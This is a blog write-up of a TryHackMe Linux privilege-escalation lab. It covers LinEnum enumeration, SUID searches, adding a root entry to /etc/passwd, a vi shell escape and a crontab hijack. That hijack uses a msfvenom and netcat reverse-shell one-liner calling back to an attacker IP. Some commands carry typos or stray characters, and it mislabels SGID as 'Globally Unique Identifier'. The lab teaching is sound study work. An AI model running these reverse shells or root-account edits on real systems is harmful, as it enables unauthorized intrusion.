---
title: "Linux Privesc"
date: 2020-12-25T01:02:30-06:00
draft: false
author: "Golgothus"
description: "My attempt at completing the TryHackMe.com Beginner Path - Linux Privilege Escalation room"
summary: "TryHackMe Beginner Path - Linux Privesc write-up."
tags: ["TryHackMe","Linux"]
featuredImage: "/images/japan.jpg"
categories: ["THM - Beginner Path"]
---

# Linux Priv Escalation

Start by downloading the LinEnum script through either of the following methods:

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

Visit the website and pull the file from [here](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh).

> It is helpful to at least view / review the material in the bash script to try and have an idea as to what actions are being performed

## Task 4

### Task 4 - Flag1

Ssh into the box given the credentials on the site

### Task 4 - Flag2 & Flag3

What is the target's host name?

For this, it would be helpful to go ahead and pull over the LinEnum script. To do this, I used the simple web client from Python, you can also just copy and paste the information into a file, then chmod +x \<file>

#### Simple Web Client

Make sure to run this from the directory your enum script is located

```bash
python -m SimpleHTTPServer 8000
```

Open another terminal / session, ssh into the vulnerable system.

Run:

```bash
wget <local ip address>:<port>/LinEnum.sh
```

Once the script is on the vulnerable system we need to chmod+x the file to make it executable

```bash
chmod +x LinEnum.sh
./LinEnum.sh
```

Review the contents as necessary to find the next few flags.

### Task 4 - Flag4

How many availabe shells are on the system?

For this flag I viewed the output from /etc/shells

```bash
cat /etc/shells
```

### Task 4 - Flag5

What is the name of the bash script that is set to run every 5 minutes by cron?

For this I used vi to search the output of the LinEnum.sh script

```bash
./LinEnum.sh > LinEnumOut.txt
vi LinEnumOut.txt
```

To search in vi, you can us **/**, followed by your search criteria. Then use **n** to search forward or **N** to search backward.

We are looking for tasks ran by cron. This will allow you to find Flag5

### Task 4 - Flag6

What critical file has been changed to allow users to write to it?

Similar to Flag5, we can search the output of LinEnumOut.txt with vi, or any other text editor. I ended up searching for critical, no luck, and after just searching for file, you can search for "sensitive" to find the flag.

## Task 5 - Abusing SUID/GUID Files

Check for files with the SUID/GUID bit set. This means that the file or files can be run with the permissions of the file(s) owner/group.

SUID - Set User ID
GUID - Globally Unique Identifier

### Task 5 - CHMOD permissions

r = read \
w = write \
x = execute

| user | group | others |
|---|---|---|
| rwx | rwx | rwx |
| 421 | 421 | 421 |

But when special permission is given to **each** user it becomes **SUID** or **SGID**. When extra bit “4” is set to user(Owner) it becomes SUID (Set user ID) and when bit “2” is set to group it becomes SGID (Set Group ID).

Therefore, the permissions to look for when looking for SUID is:

SUID:

rws-rwx-rwx

GUID:

rwx-rws-rwx

To perform the scan for SUID / GUID files manually, run the following:

```bash
find / -perm -u=s -type f 2>/dev/null
```

## Task 6 - Writing to /etc/passwd

/etc/passwd information is stored in the following format:

```bash
test:x:0:0:root:/root:/bin/bash
```

[as divided by colon (:)]

- **Username:** It is used when user logs in. It should be between 1 and 32 characters in length.
- **Password:** An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to computes the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file, in this case, the password hash is stored as an "x".
- **User ID (UID):** Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
- **Group ID (GID):** The primary group ID (stored in /etc/group file)
- **User ID Info:** The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.
- **Home directory:** The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
- **Command/shell:** The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell.

### Task 6 - Flag3

Writing to the /etc/passwd, we must use a compliant password hash, we can use the following command for this:

```bash
openssl passwd -1 -salt [salt] [password]
```

If we use the salt of **new** and the password of **123** our resulting hash can then be used in the /etc/passwd file.

### Task 6 -  Flag4

Great! Now we need to take this value, and create a new root user account. What would the /etc/passwd entry look like for a root user with the username "new" and the password hash we created before?

We can review the information above from Task 6 - Flag3 for the hash, along with the following information on setting up an account in /etc/passwd:

```bash
test:x:0:0:root:/root:/bin/bash
```

## Task 7 - Escaping vi editor

### Task 7 - Flag2

Let's use the "sudo -l" command, what does this user require (or not require) to run vi as root?

```bash
sudo -l
```

Provides the output of what commands can be ran as sudo

### Task 7 - Flag3

So, all we need to do is open vi as root, by typing "sudo vi" into the terminal.

### Task 7 - Flag4

Now, type ":!sh" to open a shell!

### Task 8 - Exploiting crontab

Useful command to run:

```bash
cat /etc/crontab
```

\# = ID

m = Minute

h = Hour

dom = Day of the month

mon = Month

dow = Day of the week

user = What user the command will run as

command = What command should be run

For Example,

|\# | m | h | dom | mon | dow | user | command |
|---|---|---|---|---|---|---|---|
|17 | \* | 1 | \*| \*| \* | root | cd / && run-parts --report /etc/cron.hourly |

### Task 8 - Flag4

Create a payload using: "msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R"*

```bash
msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
```

> Make sure to use the attack system's IP in place of LOCALIP in the above payload

### Task 8 - Flag5

What directory is the "autoscript.sh" under?

```bash
cat /etc/crontab
```

### Task 8 - Flag6

Lets replace the contents of the file with our payload using: "echo [MSFVENOM OUTPUT] > autoscript.sh"

In the terminal on the **vulnerable** host, type in the following:

```bash
echo "mkfifo /tmp/<tmp filename>; nc <localip>:<port> 0</tmp/<tmp filename> | /bin/sh >/tmp/<tmp filename> 2>&1; rm │/tmp/<tmp filename>
```

> Make sure to respectively use whatever your payload output was from **Flag4**

### Task 8 - Flag7

Setup your netcat listener on the attack system by doing the following

```bash
nc -lvp <port>
```

To test that the autoscript.sh on the vulnerable system will provide a shell, you can execute the command in your terminal like below:

```bash
mkfifo /tmp/akolks; nc 10.8.9.42 8080 0</tmp/akolks | /bin/sh >/tmp/akolks 2>&1; rm │/tmp/akolks
```

> Again, make sure to respectively use the correct payload info on your system

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Will make the shell appear similar ot most terminal prompts
